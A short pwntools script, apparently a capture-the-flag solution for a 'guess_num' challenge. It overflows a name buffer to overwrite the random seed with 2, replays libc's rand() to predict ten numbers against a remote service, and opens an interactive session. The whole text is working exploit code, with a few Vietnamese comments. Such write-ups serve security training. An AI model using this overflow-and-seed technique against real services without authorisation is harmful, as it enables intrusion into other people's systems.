from pwn import *
from ctypes import *
# p = process('./guess_num')
p = remote("111.200.241.244", "49454")

payload = "A" * 0x20 + p64(2) # ghi de hat giong = 2
print(payload)

p.recvuntil('Your name:')
p.sendline(payload)

# libc
# ldd guess_num -> libc user
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(2)

for i in range(10):
    p.recvuntil('number:')
    p.sendline(str(libc.rand() % 6 + 1))

p.interactive()
